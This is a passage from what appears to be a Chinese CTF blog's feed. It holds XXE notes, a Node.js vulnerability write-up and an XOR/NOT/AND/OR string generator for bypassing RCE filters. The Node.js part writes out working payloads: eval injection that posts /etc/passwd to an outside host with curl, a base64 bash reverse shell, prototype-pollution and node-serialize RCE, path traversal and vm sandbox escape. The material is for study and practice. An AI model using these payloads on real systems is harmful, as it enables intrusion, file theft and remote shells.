&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><p><strong>原理</strong>：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol  实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9  实体含有 10^8 个 “lol” 字符串,最后再引用lol9。</p><h2 id="探测内网端口与探测内网网站"><a href="#探测内网端口与探测内网网站" class="headerlink" title="探测内网端口与探测内网网站"></a><strong>探测内网端口与探测内网网站</strong></h2><p>这个我没复现成功。。。先拿别人的吧</p><p>漏洞代码:</p><p>test.php</p><pre><code class="php">&lt;?php$xml = simplexml_load_string($_REQUEST[&#39;xml&#39;]);print_r($xml);//注释掉该语句即为无回显的情况?&gt;</code></pre><p>探测内网端口</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p>3306端口开放<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20191202152107-4ea0fe60-14d4-1.jpg"><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202152107-4ea0fe60-14d4-1.jpg" alt="img"></a><br> 3389端口未开放<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20191202152125-5979dc4e-14d4-1.jpg"><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202152125-5979dc4e-14d4-1.jpg" alt="img"></a></p><h2 id="攻击内网网站"><a href="#攻击内网网站" class="headerlink" title="攻击内网网站"></a><strong>攻击内网网站</strong></h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/payload&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><h2 id="XXE漏洞防御"><a href="#XXE漏洞防御" class="headerlink" title="XXE漏洞防御"></a><strong>XXE漏洞防御</strong></h2><p><strong>1、使用开发语言提供的禁用外部实体的方法</strong><br> php:</p><pre><code class="php">libxml_disable_entity_loader(true);</code></pre><p>java:</p><pre><code class="java">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</code></pre><p>Python:</p><pre><code class="python">from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><p><strong>2、过滤用户提交的XML数据</strong><br> 过滤关键字：<code>&lt;\!DOCTYPE</code>和<code>&lt;\!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。<br> <strong>3、不允许XML中含有自己定义的DTD</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;自己对这个漏洞不懂原理，以及不会深入利用，就看看师傅的文章，搬运顺便复现部分场景吧。&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;XML&quot;&gt;&lt;a href=&quot;#XML&quot; class=&quot;headerlink&quot; title=&quot;XML&quot;&gt;&lt;/a&gt;XML&lt;/h1&gt;&lt;p&gt;&lt;st</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="XXE" scheme="https://sakurahack-y.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>node.js常见漏洞学习</title>
    <link href="https://sakurahack-y.github.io/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://sakurahack-y.github.io/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-04-15T15:19:35.000Z</published>
    <updated>2022-04-15T17:16:02.344Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="危险函数所导致的命令执行"><a href="#危险函数所导致的命令执行" class="headerlink" title="危险函数所导致的命令执行"></a>危险函数所导致的命令执行</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。</p><p>简单例子:</p><pre><code class="javascript">var express = require(&quot;express&quot;);var app = express();app.get(&#39;/eval&#39;,function(req,res)&#123;res.send(eval(req.query.q));console.log(req.query.q);&#125;)var server = app.listen(8888, function() &#123;console.log(&quot;应用实例，访问地址为 http://127.0.0.1:8888/&quot;);&#125;)</code></pre><p><strong>漏洞利用</strong></p><p>node.js.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造<code>require(&#39;child_process&#39;).exec(&#39;&#39;);</code>来进行调用。</p><p>弹计算器(windows):</p><pre><code class="javascript">/eval?q=require(&#39;child_process&#39;).exec(&#39;calc&#39;);</code></pre><p>读取文件(linux)：</p><pre><code class="javascript">/eval?q=require(&#39;child_process&#39;).exec(&#39;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&#39;);;</code></pre><p>反弹shell(linux)：</p><pre><code class="javascript">/eval?q=require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash&#39;);# mFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx是bash -i &gt;&amp; /dev/tcp/127.0.0.1/3333 0&gt;&amp;1 BASE64加密后的结果，直接调用会报错。注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)如果上下文中没有require,则可以使用global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)来执行命令</code></pre><h2 id="类似命令"><a href="#类似命令" class="headerlink" title="类似命令"></a>类似命令</h2><ol><li><p>间隔两秒执行函数</p><pre><code>setInteval(some_function, 2000)</code></pre></li><li><p>两秒后执行函数：</p><pre><code>setTimeout(some_function, 2000);</code></pre></li><li><p>some_function处就类似于eval函数的参数</p><pre><code>输出HelloWorld：    Function(“console.log(‘HelloWolrd’)”)()类似于php中的create_function</code></pre></li></ol><h1 id="Node-js-原型污染漏洞"><a href="#Node-js-原型污染漏洞" class="headerlink" title="Node.js 原型污染漏洞"></a>Node.js 原型污染漏洞</h1><h2 id="关于原型链"><a href="#关于原型链" class="headerlink" title="关于原型链"></a>关于原型链</h2><p>Javascript原型链参考文章：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">继承与原型链</a></p><p>文章内关于原型和原型链的知识写的非常详细，就不再总结整个过程了，以下为几个比较重要的点：</p><p>1.在javascript，每一个实例对象都有一个prototype属性，prototype 属性可以向对象添加属性和方法。</p><pre><code>object.prototype.name=value</code></pre><p>2.在javascript，每一个实例对象都有一个<code>__proto__</code>属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象：</p><pre><code>objectname[&quot;__proto__&quot;]objectname.__proto__objectname.constructor.prototype</code></pre><p>3.不同对象所生成的原型链如下(部分)：</p><pre><code>var o = &#123;a: 1&#125;;// o对象直接继承了Object.prototype// 原型链：// o ---&gt; Object.prototype ---&gt; nullvar a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];// 数组都继承于 Array.prototype// 原型链：// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; nullfunction f()&#123;return 2;&#125;// 函数都继承于 Function.prototype// 原型链：// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</code></pre><h2 id="原型链污染原理"><a href="#原型链污染原理" class="headerlink" title="原型链污染原理"></a>原型链污染原理</h2><p>对于语句：<code>object[a][b] = value</code> 如果可以控制a、b、value的值，将a设置为<code>__proto__</code>，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。</p><p>来看一个简单的例子:</p><pre><code>object1 = &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;object1.__proto__.foo = &quot;Hello World&quot;;console.log(object1.foo);object2 = &#123;&quot;c&quot;:1, &quot;d&quot;:2&#125;;console.log(object2.foo);</code></pre><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416000347433.png" alt="image-20220416000347433"></p><p>最终输出了两个hello word</p><p>为什么object2在没有设置foo属性的情况下，也会输出Hello  World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</p><h2 id="merge操作导致原型链污染"><a href="#merge操作导致原型链污染" class="headerlink" title="merge操作导致原型链污染"></a>merge操作导致原型链污染</h2><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击。</p><p>例子:</p><pre><code class="javascript">function merge(target, source) &#123;for (let key in source) &#123;if (key in source &amp;&amp; key in target) &#123;merge(target[key], source[key])&#125; else &#123;target[key] = source[key]&#125;&#125;&#125;let object1 = &#123;&#125;let object2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)merge(object1, object2)console.log(object1.a, object1.b)object3 = &#123;&#125;console.log(object3.b)# merge() 函数用于合并两个数组内容到第一个数组。在本段代码的作用就是将待操作的对象merge到一个空对象中</code></pre><p>需要注意的点是：</p><p>在JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。</p><p>我们来看下，有和没有JSON解析的区别</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416001143881.png" alt="image-20220416001143881"></p><p>所以代码在执行过程中会存在这么一步</p><pre><code class="javascript">target[__proto__]=source[__proto__]可理解为  object.prototype = &#123;&quot;b&quot;: 2&#125; 导致了原型链污染</code></pre><p>最终输出的结果为：</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416000830058.png" alt="image-20220416000830058"></p><p>可见object3的b是从原型中获取到的，说明Object已经被污染了。</p><h2 id="Code-Breaking-2018-Thejs"><a href="#Code-Breaking-2018-Thejs" class="headerlink" title="Code-Breaking 2018 Thejs"></a>Code-Breaking 2018 Thejs</h2><p>题目源码下载：<a href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p><p>server.js</p><pre><code class="javascript">const fs = require(&#39;fs&#39;)const express = require(&#39;express&#39;)const bodyParser = require(&#39;body-parser&#39;)const lodash = require(&#39;lodash&#39;)const session = require(&#39;express-session&#39;)const randomize = require(&#39;randomatic&#39;)const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#39;/static&#39;, express.static(&#39;static&#39;))app.use(session(&#123;    name: &#39;thejs.session&#39;,    secret: randomize(&#39;aA0&#39;, 16),    resave: false,    saveUninitialized: false&#125;))app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; // define the template engine    fs.readFile(filePath, (err, content) =&gt; &#123;        if (err) return callback(new Error(err))        let compiled = lodash.template(content)        let rendered = compiled(&#123;...options&#125;)        return callback(null, rendered)    &#125;)&#125;)app.set(&#39;views&#39;, &#39;./views&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.all(&#39;/&#39;, (req, res) =&gt; &#123;    let data = req.session.data || &#123;language: [], category: []&#125;    if (req.method == &#39;POST&#39;) &#123;        data = lodash.merge(data, req.body)        req.session.data = data    &#125;        res.render(&#39;index&#39;, &#123;        language: data.language,         category: data.category    &#125;)&#125;)app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`))</code></pre><p>问题出在lodash.merge()函数,这个函数存在原型链污染漏洞。我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416004841823.png" alt="image-20220416004841823"></p><p>页面最终会通过lodash.template进行渲染</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416005502144.png" alt="image-20220416005502144"></p><p>跟踪到lodash/template.js中</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/QyN5JVOde3YL8aZ.png" alt="template_js.png"></p><p>如图可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。</p><p>继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/pwoVFrOyfzJX42M.png" alt="template_js01.png"></p><p>通过构造chile_process.exec()就可以执行任意代码了。</p><p>最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)：</p><pre><code>&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nglobal.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)//&quot;&#125;&#125;</code></pre><p>(这里直接用require会报错：ReferenceError: require is not defined</p><p>p神给了一个更好的payload：</p><pre><code>&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;id&#39;)&#125;\n//&quot;&#125;&#125;</code></pre><h1 id="node-serialize反序列化RCE漏洞-CVE-2017-5941"><a href="#node-serialize反序列化RCE漏洞-CVE-2017-5941" class="headerlink" title="node-serialize反序列化RCE漏洞(CVE-2017-5941)"></a>node-serialize反序列化RCE漏洞(CVE-2017-5941)</h1><p>漏洞出现在node-serialize模块0.0.4版本当中，使用<code>npm install node-serialize@0.0.4</code>安装模块。</p><p><strong>了解什么是IIFE：</strong></p><p>IIFE(立即调用函数表达式)是一个在定义时就会立即执行的 JavaScript 函数。</p><p>IIFE一般写成下面的形式：</p><pre><code>(function()&#123; /* code */ &#125;());// 或者(function()&#123; /* code */ &#125;)();</code></pre><ul><li><code>node-serialize@0.0.4</code>漏洞点</li></ul><p>漏洞代码位于node_modules\node-serialize\lib\serialize.js中：</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/aDr6o823Ux4F5Zw.png" alt="serialize_eval.png"></p><p>其中的关键就是：<code>obj[key] = eval(&#39;(&#39; + obj[key].substring(FUNCFLAG.length) + &#39;)&#39;);</code>这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个<code>function()&#123;&#125;()</code>函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload：</p><p><strong>构造Payload</strong></p><pre><code class="javascript">serialize = require(&#39;node-serialize&#39;);var test = &#123; rce : function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;,&#125;console.log(&quot;序列化生成的 Payload: \n&quot; + serialize.serialize(test));</code></pre><p>生成的Payload为：</p><pre><code class="javascript">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;&quot;&#125;</code></pre><p>因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个<code>()</code>，结果如下：</p><pre><code class="javascript">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;</code></pre><p>(这里不能直接在对象内定义IIFE表达式，不然会序列化失败)</p><p>传递给unserialize(注意转义单引号)：</p><pre><code class="javascript">var serialize = require(&#39;node-serialize&#39;);var payload = &#39;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(\&#39;child_process\&#39;).exec(\&#39;ls /\&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;&#39;;serialize.unserialize(payload);</code></pre><p>执行命令成功，结果如图：</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/V1hOMYz7fQ3KB6X.png" alt="serialize_result.png"></p><h1 id="Node-js-目录穿越漏洞复现-CVE-2017-14849"><a href="#Node-js-目录穿越漏洞复现-CVE-2017-14849" class="headerlink" title="Node.js 目录穿越漏洞复现(CVE-2017-14849)"></a>Node.js 目录穿越漏洞复现(CVE-2017-14849)</h1><p>漏洞影响的版本：</p><ul><li>Node.js 8.5.0 + Express 3.19.0-3.21.2</li><li>Node.js 8.5.0 + Express 4.11.0-4.15.5</li></ul><p>运行漏洞环境：</p><pre><code>cd vulhub/node/CVE-2017-14849/docker-compose builddocker-compose up -d</code></pre><p>用Burpsuite获取地址：<code>/static/../../../a/../../../../etc/passwd</code> 即可下载得到<code>/etc/passwd</code>文件</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/L8pV6gXoAnJSRQ4.png" alt="node_dir.png"></p><h1 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h1><p>vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸：</p><p>逃逸例子：</p><pre><code>const vm = require(&quot;vm&quot;);const env = vm.runInNewContext(`this.constructor.constructor(&#39;return this.process.env&#39;)()`);console.log(env);</code></pre><p>执行之后可以获取到主程序环境中的环境变量</p><p>上面例子的代码等价于如下代码：</p><pre><code>const vm = require(&#39;vm&#39;);const sandbox = &#123;&#125;;const script = new vm.Script(&quot;this.constructor.constructor(&#39;return this.process.env&#39;)()&quot;);const context = vm.createContext(sandbox);env = script.runInContext(context);console.log(env);</code></pre><p>创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。</p><p>因为<code>this.constructor.constructor</code>返回的是一个<code>Function constructor</code>，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是<code>return this.process.env</code>，结果是返回了主程序的环境变量。</p><p>配合<code>chile_process.exec()</code>就可以执行任意命令了：</p><pre><code>const vm = require(&quot;vm&quot;);const env = vm.runInNewContext(`const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()`);console.log(env);</code></pre><p>最近的mongo-express RCE(CVE-2019-10758)漏洞就是配合vm沙箱逃逸来利用的。</p><p>具体分析可参考：<a href="https://xz.aliyun.com/t/7056">CVE-2019-10758:mongo-expressRCE复现分析</a></p><h1 id="javascript大小写特性"><a href="#javascript大小写特性" class="headerlink" title="javascript大小写特性"></a>javascript大小写特性</h1><p>在javascript中有几个特殊的字符需要记录一下</p><p>对于toUpperCase():</p><pre><code>字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</code></pre><p>对于toLowerCase():</p><pre><code>字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</code></pre><p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p><p><strong>CTF题实例 - Hacktm中的一道Nodejs题</strong></p><p>题目部分源码：</p><pre><code class="javascript">function isValidUser(u) &#123;  return (    u.username.length &gt;= 3 &amp;&amp;    u.username.toUpperCase() !== config.adminUsername.toUpperCase()  );&#125;function isAdmin(u) &#123;  return u.username.toLowerCase() == config.adminUsername.toLowerCase();&#125;</code></pre><p>解题时需要登录管理员的用户名，但是在登录时，<code>isValidUser</code>函数会对用户输入的用户名进行<code>toUpperCase</code>处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。</p><p>但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是<code>toLowerCase</code>。所以这两个差异，就可以使用大小写特性来进行绕过。</p><p>题目中默认的管理员用户名为：hacktm</p><p>所以，我们指定登录时的用户名为：hacKtm 即可绕过<code>isValidUser</code>和<code>isAdmin</code>的验证。</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;危险函数所导致的命令执行&quot;&gt;&lt;a href=&quot;#危险函数所导致的命令执行&quot; class=&quot;headerlink&quot; title=&quot;危险函数所导致的命令执行&quot;&gt;&lt;/a&gt;危险函数所导致的命令执行&lt;/h1&gt;&lt;h2 id=&quot;eval&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="node.js" scheme="https://sakurahack-y.github.io/tags/node-js/"/>
    
  </entry>
  
  <entry>
    <title>rce常用脚本</title>
    <link href="https://sakurahack-y.github.io/2022/04/12/rce%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC/"/>
    <id>https://sakurahack-y.github.io/2022/04/12/rce%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC/</id>
    <published>2022-04-11T17:16:30.000Z</published>
    <updated>2022-04-11T17:17:22.381Z</updated>
    
    <content type="html"><![CDATA[<p>很好用，各种绕过姿势</p><pre><code class="python">from typing import finalimport stringdef realHex(num):    if num &lt;16:        return &quot;%0&quot;+hex(num)[2:]    else:        return &#39;%&#39;+hex(num)[2:]pattern=input(&quot;请输入正则过滤式,没有则直接回车跳过\n&quot;)#正则表达式修饰符re.I大小写不敏感,re.M多行匹配,影响^和$,re.S使得.匹配包括换行在内的所有字符,re.U根据Unicode字符集解析字符,影响\w,\W,\b,\B#建议回车跳过,这个功能很逊if pattern != &quot;&quot;:    import re    blacklist=[&quot;`&quot;,&quot;&#39;&quot;,&#39;&quot;&#39;,&quot;\\&quot;]    for i in range(32,255):        if  re.search(pattern,chr(i),re.I):            blacklist.append(chr(i))else:    #blacklist列表中的字符在生成的拼接字符串中不会被使用,除了部分是被过滤掉的字符，其余的如&#39;,&quot;等字符考虑可能会导致闭合等问题暂列入    #如果有其他的要求可以对blacklist列表进行删改    #!注意对于|和&amp;来说拼凑字符是相当困难的,并且可用范围实际上是31-255,这就导致了要这样用必须引号包裹,否则大概率GG    #比如&#123;,&#125;,;,|,&amp;,$等诸多符号不带引号会导致无法使用    blacklist=[]    for word in string.ascii_letters+string.digits:        blacklist.append(word)    blacklist+=[&quot; &quot;,&quot;^&quot;,&quot;~&quot;,&quot;|&quot;,&quot;&#39;&quot;,&#39;&quot;&#39;,&quot;\\&quot;]#print(blacklist)#不同于取反,一个目标字符串使用异或的方式可以获大量的可用拼接字符串,这里只取了1种组合的拼接字符串#如果需要获得更多拼接字符串查看该函数中的result列表def yiHuo(string):    global operationEffient    global blacklist    operationEffient=False    result=[]    finalstr=&#39;&quot;&quot;^&quot;&quot;&#39;    rawstr=string    for i in range(0,len(rawstr)):        result.extend([[]])    for k in range(0,len(rawstr)):        #这里更换范围        for i in range(1,255):           if(chr(i) not in blacklist):               #这里更换范围                for j in range(1,255):                    if(chr(j) not in blacklist):                        if(i^j==ord(rawstr[k]) and [hex(j).replace(&#39;0x&#39;,&quot;%&quot;),hex(i).replace(&#39;0x&#39;,&quot;%&quot;)] not in result[k]):                            result[k].extend([[realHex(i),realHex(j)]])    #在这里往下的函数部分,result列表均是可用的(已填充了获得的拼接字符串)    for i in range(0,len(result)):        if(len(result[i])==0):            return(&quot;该字符在现有黑名单和字符范围下无法拼接出-&gt;%s&quot;%(rawstr[i]))    for i in range(0,len(rawstr)):        finalstr=finalstr[:finalstr.find(&quot;^&quot;,0)-1]+result[i][0][0]+&#39;&quot;&#39;+finalstr[finalstr.find(&quot;^&quot;,0):]        finalstr=finalstr[:finalstr.rfind(&quot;&#39;&quot;,0)]+result[i][0][1]+finalstr[finalstr.rfind(&#39;&quot;&#39;,0):]    return finalstrdef quFan(string):    global operationEffient    global blacklist    operationEffient=False    result=[]    finalstr=&#39;~&quot;&quot;&#39;    rawstr=string    for i in range(0,len(rawstr)):        result.extend([[]])    for k in range(0,len(rawstr)):        #这里更换范围        for i in range(1,255):           if(chr(i) not in blacklist and chr(int(bin(~i &amp; 0xFF)[2:],2))==rawstr[k]):               result[k].extend([realHex(i)])    #print(result)    for i in range(0,len(result)):        if(len(result[i])==0):            return(&quot;该字符在现有黑名单和字符范围下无法拼接出-&gt;%s&quot;%(rawstr[i]))    for i in range(0,len(rawstr)):        finalstr=finalstr[:finalstr.rfind(&#39;&quot;&#39;,0)]+result[i][0]+finalstr[finalstr.rfind(&#39;&quot;&#39;,0):]    return finalstrdef rce_and(string):    global operationEffient    global blacklist    operationEffient=False    rawstring=string    result=[]    finalstr=&quot;&quot;    for i in range(0,len(rawstring)):        result.extend([[]])    for l in range(0,len(rawstring)):        for i in range(1,255):            for j in range(1,255):                if (chr(j) in blacklist) or (chr(i) in blacklist):                    continue                if chr(i&amp;j)==rawstring[l]:                    #注意&amp;在URL特殊含义,故需要URL编码                    result[l].append(&quot;\&quot;&quot;+realHex(i)+&quot;\&quot;%26\&quot;&quot;+realHex(j)+&quot;\&quot;&quot;)                    continue    for i in range(0,len(result)):        if(len(result[i])==0):            print(&quot;该字符在现有黑名单和字符范围下无法拼接出-&gt;%s&quot;%(rawstring[i]))            return    for i in range(0,len(result)):        if i == 0:            finalstr+=&quot;(&#123;&#125;)&quot;.format(result[i][0])        else:            finalstr+=&quot;.(&#123;&#125;)&quot;.format(result[i][0])    return finalstrdef rce_or(string):    global operationEffient    global blacklist    operationEffient=False    rawstring=string    result=[]    finalstr=&quot;&quot;    for i in range(0,len(rawstring)):        result.extend([[]])    for l in range(0,len(rawstring)):        for i in range(1,255):            for j in range(1,255):                if (chr(j) in blacklist) or (chr(i) in blacklist):                    continue                if chr(i|j)==rawstring[l]:                    result[l].append(&quot;\&quot;&quot;+realHex(i)+&quot;\&quot;|\&quot;&quot;+realHex(j)+&quot;\&quot;&quot;)                    continue    for i in range(0,len(result)):        if(len(result[i])==0):            print(&quot;该字符在现有黑名单和字符范围下无法拼接出-&gt;%s&quot;%(rawstring[i]))            return    for i in range(0,len(result)):        if i == 0:            finalstr+=&quot;(&#123;&#125;)&quot;.format(result[i][0])        else:            finalstr+=&quot;.(&#123;&#125;)&quot;.format(result[i][0])    return finalstrwhile(True):    operationEffient=True    target=input(&quot;请输入待转换字符\n&quot;)    while(operationEffient):        operation=input(&quot;请选择操作\n0-&gt;重新输入\n1-&gt;使用异或拼接\n2-&gt;使用取反获得\n3-&gt;使用二进制和\n4-&gt;使用二进制或\n&quot;)        if(operation==&quot;1&quot;):            result=yiHuo(target)            pass        elif(operation==&quot;2&quot;):            result=quFan(target)            pass        elif(operation==&#39;3&#39;):            result=rce_and(target)            pass        elif(operation==&#39;4&#39;):            result=rce_or(target)            pass        elif(operation==&quot;0&quot;):            break        else:            print(&quot;选择的操作无效&quot;)            continue        if result!=&#39;&#39;:            print(result)</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;很好用，各种绕过姿势&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;from typing import final
import string

def realHex(num):
    if num &amp;lt;16:
        return &amp;quo</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="脚本" scheme="https://sakurahack-y.github.io/categories/CTF/%E8%84%9A%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>timeline sec新人赛</title>
    <link href="https://sakurahack-y.github.io/2022/04/11/timeline-sec%E6%96%B0%E4%BA%BA%E8%B5%9B/"/>
    <id>https://sakurahack-y.github.io/2022/04/11/timeline-sec%E6%96%B0%E4%BA%BA%E8%B5%9B/</id>
